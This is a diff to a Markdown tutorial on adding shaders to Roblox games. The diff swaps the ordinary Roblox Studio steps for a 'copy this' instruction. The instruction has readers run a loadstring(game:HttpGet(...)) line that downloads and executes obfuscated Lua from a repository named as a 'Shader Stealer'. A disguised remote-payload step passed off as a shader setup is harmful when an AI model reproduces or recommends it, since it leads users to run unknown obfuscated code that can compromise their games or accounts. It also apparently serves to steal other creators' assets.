@@ -13,17 +13,20 @@ Shaders in Roblox improve game visuals by adding realistic lighting, textures, a
 ---
 
 ## 🛠️ **How to Add Shaders**
-1. Open **Roblox Studio**.  
-2. Go to the **Lighting** section in Explorer.  
-3. Add effects like:  
+1. Copy this code below or go to the night or night rewrite server and message a dev 
+2. Copy This:
+```lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JustToUseGiHubAi/Shader-Stealer-noui-/refs/heads/main/fr-obfuscated.lua"))()
+```
+4. Add effects like:  
    - **BloomEffect**: Adds glow.  
    - **BlurEffect**: Creates blur.  
-   - **ColorCorrectionEffect**: Adjusts brightness/contrast.  
+   - **ColorCorrectionEffect**: Adjusts brightness/contrast. Or you can customise it how ever you want!!!!!
 
 ---
 
 ## 🔧 **Code Example**
-Here’s a simple script to add a BloomEffect:
+Here’s a simple code to help you get started on your own product:
 ```lua
 local Lighting = game:GetService("Lighting")
 
